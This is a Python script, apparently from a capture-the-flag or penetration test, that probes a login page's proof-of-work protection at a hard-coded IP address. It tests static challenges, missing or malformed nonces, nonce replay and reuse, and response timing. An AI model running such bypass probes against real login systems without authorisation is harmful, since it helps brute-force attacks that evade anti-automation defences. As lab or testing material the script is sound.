#!/usr/bin/env python3
"""
Analyze the PoW mechanism for vulnerabilities
"""

import requests
from bs4 import BeautifulSoup
import hashlib
import time

BASE_URL = "http://138.199.163.92:16969"

print("="*60)
print("Analyzing PoW Mechanism")
print("="*60)

# 1. Check if PoW challenge changes
print("\n[*] Checking if PoW challenge is static or dynamic...")
challenges = []
for i in range(5):
    resp = requests.get(f"{BASE_URL}/login")
    soup = BeautifulSoup(resp.text, 'html.parser')
    challenge = soup.find('input', {'name': 'pow_challenge'})['value']
    challenges.append(challenge)
    print(f"  Request {i+1}: {challenge}")
    time.sleep(0.5)

if len(set(challenges)) == 1:
    print("  [!] PoW challenge is STATIC! Same challenge every time.")
    print("  [!] We can pre-compute the nonce!")
else:
    print("  PoW challenge is dynamic")

# 2. Try to bypass PoW
print("\n[*] Trying to bypass PoW...")

challenge_resp = requests.get(f"{BASE_URL}/login")
soup = BeautifulSoup(challenge_resp.text, 'html.parser')
challenge = soup.find('input', {'name': 'pow_challenge'})['value']

# Try with no nonce
print("  Testing without nonce...")
data = {
    'pow_challenge': challenge,
    'username': 'test',
    'password': 'test'
}
resp = requests.post(f"{BASE_URL}/login", data=data)
print(f"    No nonce: {resp.status_code}")

# Try with wrong nonce
print("  Testing with wrong nonce...")
data['pow_nonce'] = '0'
resp = requests.post(f"{BASE_URL}/login", data=data)
print(f"    Wrong nonce (0): {resp.status_code}")

# Try with very large nonce
print("  Testing with large nonce...")
data['pow_nonce'] = '999999999'
resp = requests.post(f"{BASE_URL}/login", data=data)
print(f"    Large nonce: {resp.status_code}")

# Try with negative nonce
print("  Testing with negative nonce...")
data['pow_nonce'] = '-1'
resp = requests.post(f"{BASE_URL}/login", data=data)
print(f"    Negative nonce: {resp.status_code}")

# 3. Check if we can reuse a nonce
print("\n[*] Checking if nonce can be reused...")

# Get a valid nonce (try a few common ones)
def sha256hex(text):
    return hashlib.sha256(text.encode()).hexdigest()

target = 2 ** (256 - 18)
valid_nonce = None

# Try some pre-computed nonces that might work
for test_nonce in range(0, 10000, 100):
    hash_result = sha256hex(challenge + str(test_nonce))
    if int(hash_result, 16) < target:
        valid_nonce = test_nonce
        print(f"  Found valid nonce: {valid_nonce}")
        break

if valid_nonce:
    # Try to use it multiple times
    for i in range(3):
        data = {
            'pow_challenge': challenge,
            'pow_nonce': str(valid_nonce),
            'username': 'test',
            'password': 'test'
        }
        resp = requests.post(f"{BASE_URL}/login", data=data)
        print(f"  Attempt {i+1} with same nonce: {resp.status_code}")
        time.sleep(0.5)

# 4. Check if we can use old challenge/nonce pairs
print("\n[*] Checking if old challenge/nonce pairs work...")

# Get new challenge
new_resp = requests.get(f"{BASE_URL}/login")
new_soup = BeautifulSoup(new_resp.text, 'html.parser')
new_challenge = new_soup.find('input', {'name': 'pow_challenge'})['value']

if valid_nonce and new_challenge != challenge:
    # Try old nonce with new challenge
    data = {
        'pow_challenge': new_challenge,
        'pow_nonce': str(valid_nonce),
        'username': 'test',
        'password': 'test'
    }
    resp = requests.post(f"{BASE_URL}/login", data=data)
    print(f"  Old nonce with new challenge: {resp.status_code}")

# 5. Check for timing attacks on PoW validation
print("\n[*] Checking PoW validation timing...")

times = []
for nonce_val in ['0', '1', '999999']:
    data = {
        'pow_challenge': challenge,
        'pow_nonce': nonce_val,
        'username': 'test',
        'password': 'test'
    }
    start = time.time()
    resp = requests.post(f"{BASE_URL}/login", data=data)
    elapsed = time.time() - start
    times.append((nonce_val, elapsed, resp.status_code))
    print(f"  Nonce {nonce_val}: {elapsed:.3f}s - Status: {resp.status_code}")

print("\n[*] Analysis complete!")
